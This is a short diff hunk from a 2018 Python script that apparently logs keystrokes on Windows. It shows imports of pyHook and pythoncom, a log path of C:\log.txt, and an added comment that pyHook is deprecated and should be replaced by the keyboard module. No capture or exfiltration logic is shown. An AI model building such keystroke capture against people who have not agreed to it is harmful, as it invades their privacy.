@@ -5,7 +5,7 @@ Created on Mon Aug 20 21:07:28 2018
 @author: Carlo
 """
 
-import pyHook, pythoncom, sys, logging
+import pyHook, pythoncom, sys, logging   #pyHook is now deprecated. this need to be refreshed using keyboard module
  
 file_log="C:\log.txt"
  
